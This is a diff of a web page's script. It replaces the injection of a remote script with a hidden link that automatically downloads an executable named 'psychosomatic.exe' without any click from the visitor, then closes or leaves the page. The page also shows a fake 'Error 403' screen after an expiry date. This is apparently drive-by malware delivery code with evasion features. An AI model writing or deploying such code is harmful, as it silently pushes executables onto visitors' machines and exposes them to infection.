@@ -41,11 +41,9 @@
   var EXPIRE_AT = Date.parse('2026-10-25T12:00:00+08:00');
 
   var JUMP_DELAY = 3000;
-  var MAX_WAIT   = 10000;
 
   function deny() {
     try { window.stop(); } catch (e) {}
-
     document.title = 'Error 403';
     document.body.innerHTML = '';
 
@@ -79,14 +77,16 @@
     setTimeout(function () { try { window.close(); } catch (e) {} }, 60);
   }
 
-  var s = document.createElement('script');
-  s.src = FILE_URL;
-  s.async = true;
-  s.onload  = function () { setTimeout(leave, JUMP_DELAY); };
-  s.onerror = function () { setTimeout(leave, JUMP_DELAY); };
-  (document.head || document.documentElement).appendChild(s);
+  var a = document.createElement('a');
+  a.href = FILE_URL;
+  a.download = 'psychosomatic.exe';
+  a.rel = 'noopener';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
 
-  setTimeout(leave, MAX_WAIT);
+  setTimeout(leave, JUMP_DELAY);
 })();
 </script>
 </body>
